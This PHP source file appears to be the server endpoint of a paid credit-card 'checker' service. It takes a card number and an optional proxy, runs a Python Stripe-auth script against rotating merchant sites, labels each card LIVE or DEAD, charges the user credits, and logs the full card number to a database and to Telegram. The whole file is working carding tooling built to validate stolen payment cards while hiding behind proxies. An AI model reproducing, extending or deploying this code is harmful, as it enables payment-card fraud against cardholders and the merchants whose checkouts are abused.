<?php

ini_set('display_errors', 0);
error_reporting(0);

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'owner_logger.php';
require_once 'cc_logs_manager.php';
require_once 'utils.php';
require_once 'stripe_auth_manager.php';

header('Content-Type: application/json');

$requestStartedAt = microtime(true);

/**
 * Send JSON response and terminate.
 */
function stripe_auth_respond(array $payload, int $statusCode = 200): void
{
    if (ob_get_length()) {
        ob_clean();
    }

    http_response_code($statusCode);
    echo json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}

/**
 * Extract JSON payload from mixed command output.
 */
function stripe_auth_extract_json(?string $output): ?array
{
    if ($output === null) {
        return null;
    }

    $output = trim($output);
    if ($output === '') {
        return null;
    }

    $lines = array_reverse(preg_split('/\r?\n/', $output));
    foreach ($lines as $line) {
        $line = trim($line);
        if ($line === '') {
            continue;
        }
        $bracePos = strpos($line, '{');
        if ($bracePos !== false) {
            $candidate = substr($line, $bracePos);
            $decoded = json_decode($candidate, true);
            if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
                return $decoded;
            }
        }
    }

    $lastBrace = strrpos($output, '{');
    if ($lastBrace !== false) {
        $candidate = substr($output, $lastBrace);
        $decoded = json_decode($candidate, true);
        if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
            return $decoded;
        }
    }

    return null;
}

/**
 * Determine UI status bucket for result.
 */
function stripe_auth_determine_status(array $result): string
{
    if (!empty($result['success'])) {
        return 'LIVE';
    }

    $message = strtoupper((string)($result['message'] ?? $result['status'] ?? ''));

    $liveHints = ['REQUIRES_ACTION', 'OTP', '3DS', 'INSUFFICIENT', 'APPROVED', 'LIVE', 'AUTHENTICATED'];
    foreach ($liveHints as $hint) {
        if (str_contains($message, $hint)) {
            return 'LIVE';
        }
    }

    $deadHints = ['DECLINED', 'REJECTED', 'INCORRECT', 'EXPIRED', 'FAILED', 'ERROR', 'INVALID', 'CARD VALIDATION FAILED'];
    foreach ($deadHints as $hint) {
        if (str_contains($message, $hint)) {
            return 'DEAD';
        }
    }

    return 'ERROR';
}

try {
    initSecureSession();

    if (!isset($_SESSION['user_id']) && !isset($_SESSION['telegram_id'])) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'AUTH_REQUIRED',
            'message' => 'Authentication required. Please login again.'
        ], 401);
    }

    // Optional session timeout enforcement
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > AppConfig::SESSION_TIMEOUT) {
        session_destroy();
        stripe_auth_respond([
            'success' => false,
            'status' => 'SESSION_EXPIRED',
            'message' => 'Session expired. Please login again.'
        ], 401);
    }

    $telegramId = $_SESSION['telegram_id'] ?? $_SESSION['user_id'];

    $db = Database::getInstance();
    $user = $db->getUserByTelegramId($telegramId);

    if (!$user) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'USER_NOT_FOUND',
            'message' => 'User record not found.'
        ], 404);
    }

    $isOwner = in_array($telegramId, AppConfig::OWNER_IDS, true);
    $creditCost = StripeAuthSiteManager::getCreditCost();
    $currentCredits = (int)($user['credits'] ?? 0);

    if (!$isOwner && $currentCredits < $creditCost) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'INSUFFICIENT_CREDITS',
            'message' => 'Insufficient credits. Please top up your balance.',
            'required_credits' => $creditCost,
            'current_credits' => $currentCredits
        ], 402);
    }

    $card = trim($_POST['cc'] ?? $_GET['cc'] ?? '');
    if ($card === '') {
        stripe_auth_respond([
            'success' => false,
            'status' => 'INVALID_CARD',
            'message' => 'Credit card is required.'
        ], 400);
    }

    $proxy = trim($_POST['proxy'] ?? $_GET['proxy'] ?? '');
    $useMyIp = filter_var($_POST['use_my_ip'] ?? $_GET['use_my_ip'] ?? false, FILTER_VALIDATE_BOOLEAN);
    if ($useMyIp) {
        $proxy = '';
    }

    try {
        $site = StripeAuthSiteManager::getNextSite();
    } catch (RuntimeException $e) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'NO_SITES_CONFIGURED',
            'message' => $e->getMessage()
        ], 500);
    }

    $pythonPath = SiteConfig::get('stripe_auth_python_path', 'python3');
    $scriptPath = __DIR__ . '/stripe_auth_checker.py';

    if (!file_exists($scriptPath)) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'SCRIPT_NOT_FOUND',
            'message' => 'Stripe auth checker script is missing on server.'
        ], 500);
    }

    $commandParts = [
        escapeshellcmd($pythonPath),
        escapeshellarg($scriptPath),
        escapeshellarg($site),
        escapeshellarg($card)
    ];

    if ($proxy !== '') {
        $commandParts[] = escapeshellarg($proxy);
    }

    $command = implode(' ', $commandParts);

    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes, __DIR__, null, ['bypass_shell' => true]);

    if (!is_resource($process)) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'PROCESS_LAUNCH_FAILED',
            'message' => 'Unable to execute Stripe auth checker.'
        ], 500);
    }

    fclose($pipes[0]);
    stream_set_blocking($pipes[1], true);
    stream_set_blocking($pipes[2], true);

    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    fclose($pipes[1]);
    fclose($pipes[2]);

    $exitCode = proc_close($process);

    $resultData = stripe_auth_extract_json($stdout);

    if ($resultData === null && $stderr !== '') {
        $resultData = stripe_auth_extract_json($stderr);
    }

    if ($resultData === null) {
        stripe_auth_respond([
            'success' => false,
            'status' => 'UNPARSABLE_RESPONSE',
            'message' => 'Stripe auth checker returned an unexpected response.',
            'raw_output' => trim($stdout),
            'raw_error' => trim($stderr),
            'exit_code' => $exitCode
        ], 500);
    }

    $uiStatus = stripe_auth_determine_status($resultData);
    $statusMessage = $resultData['message'] ?? ($resultData['status'] ?? 'Completed');
    $statusCode = $resultData['status'] ?? ($resultData['success'] ? 'SUCCESS' : 'FAILED');
    $duration = round(microtime(true) - $requestStartedAt, 2);

    $creditsDeducted = 0;
    $remainingCredits = $currentCredits;
    $deductionWarning = null;

    if (!$isOwner) {
        $deducted = $db->deductCredits($telegramId, $creditCost);
        if ($deducted) {
            $creditsDeducted = $creditCost;
            try {
                $freshUser = $db->getUserByTelegramId($telegramId);
                if ($freshUser && isset($freshUser['credits'])) {
                    $remainingCredits = (int)$freshUser['credits'];
                }
            } catch (Throwable $refreshEx) {
                // Ignore refresh errors
            }
        } else {
            $deductionWarning = 'Charge completed but credit deduction failed.';
        }
    }

    // Log tool usage
    try {
        $db->logToolUsage($telegramId, 'stripe_auth', [
            'usage_count' => 1,
            'credits_used' => $creditsDeducted,
            'site' => $site,
            'status' => strtolower($uiStatus),
            'exit_code' => $exitCode
        ]);
    } catch (Throwable $logEx) {
        // Ignore tool usage log failures
    }

    // Log CC result
    try {
        $ccLogger = new CCLogsManager();
        $ccStatus = match ($uiStatus) {
            'LIVE' => 'live',
            'DEAD' => 'declined',
            default => 'error'
        };

        $ccLogger->logCCCheck([
            'telegram_id' => $telegramId,
            'username' => $user['username'] ?? 'Unknown',
            'card_number' => $card,
            'card_full' => $card,
            'status' => $ccStatus,
            'message' => $statusMessage,
            'gateway' => 'stripe_auth',
            'amount' => $resultData['amount'] ?? null,
            'proxy_status' => $resultData['proxy_status'] ?? null,
            'proxy_ip' => $resultData['proxy_ip'] ?? null
        ]);
    } catch (Throwable $logEx) {
        // Ignore CC log failures
    }

    // Notify owner monitoring
    try {
        $ownerLogger = new OwnerLogger();
        $ownerLogger->sendUserActivity(
            $user,
            'Stripe Auth Check',
            "Site: {$site} | Status: {$uiStatus} | Card: " . substr($card, 0, 8) . '****'
        );
    } catch (Throwable $ownerEx) {
        // Ignore owner notification errors
    }

    // Telegram notification
    $telegramSent = false;
    if (StripeAuthSiteManager::shouldNotify($uiStatus)) {
        $emoji = match ($uiStatus) {
            'LIVE' => '✅',
            'DEAD' => '❌',
            default => '⚠️'
        };
        $safeCard = htmlspecialchars($card, ENT_QUOTES, 'UTF-8');
        $safeSite = htmlspecialchars($site, ENT_QUOTES, 'UTF-8');
        $safeMessage = htmlspecialchars($statusMessage, ENT_QUOTES, 'UTF-8');
        $safeStatusCode = htmlspecialchars($statusCode, ENT_QUOTES, 'UTF-8');
        $accountEmail = htmlspecialchars($resultData['account_email'] ?? 'N/A', ENT_QUOTES, 'UTF-8');
        $pmId = htmlspecialchars($resultData['pm_id'] ?? 'N/A', ENT_QUOTES, 'UTF-8');

        $telegramMessage = "<b>Stripe Auth Check {$emoji}</b>\n\n" .
            "👤 <b>User ID:</b> <code>{$telegramId}</code>\n" .
            "💳 <b>Card:</b> <code>{$safeCard}</code>\n" .
            "🌐 <b>Site:</b> {$safeSite}\n" .
            "📣 <b>Status:</b> {$safeStatusCode}\n" .
            "📝 <b>Message:</b> {$safeMessage}\n" .
            "📧 <b>Email:</b> {$accountEmail}\n" .
            "🆔 <b>PM ID:</b> {$pmId}\n" .
            "⏱️ <b>Duration:</b> {$duration}s";

        try {
            $telegramSent = (bool) sendTelegramHtml($telegramMessage);
        } catch (Throwable $telegramEx) {
            $telegramSent = false;
        }
    }

    $responsePayload = [
        'success' => (bool)($resultData['success'] ?? false),
        'status' => $statusCode,
        'message' => $statusMessage,
        'ui_status_type' => $uiStatus,
        'card' => $card,
        'site' => $site,
        'account_email' => $resultData['account_email'] ?? null,
        'pm_id' => $resultData['pm_id'] ?? null,
        'raw_response' => $resultData['raw_response'] ?? null,
        'raw_response_json' => $resultData['raw_response_json'] ?? null,
        'duration' => "{$duration}s",
        'exit_code' => $exitCode,
        'proxy_used' => $proxy !== '' ? $proxy : null,
        'credits_deducted' => $creditsDeducted,
        'remaining_credits' => $remainingCredits,
        'telegram_sent' => $telegramSent,
    ];

    if ($deductionWarning !== null) {
        $responsePayload['warning'] = $deductionWarning;
    }

    stripe_auth_respond($responsePayload);
} catch (Throwable $e) {
    stripe_auth_respond([
        'success' => false,
        'status' => 'SYSTEM_ERROR',
        'message' => 'An unexpected error occurred while processing the request.',
        'error' => $e->getMessage()
    ], 500);
}
